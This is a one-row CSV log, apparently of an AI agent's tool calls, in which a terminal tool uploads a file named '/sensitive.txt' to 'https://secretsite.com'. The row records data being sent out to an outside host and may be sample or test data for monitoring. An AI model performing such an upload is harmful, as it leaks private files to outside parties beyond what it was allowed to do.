ts,tool_name,command,parameters_json,affected_path,size_bytes
2026-01-02 14:52:45,terminal_command,upload_file,"{""command"": ""upload_file"", ""file_path"": ""/sensitive.txt"", ""url"": ""https://secretsite.com""}",,
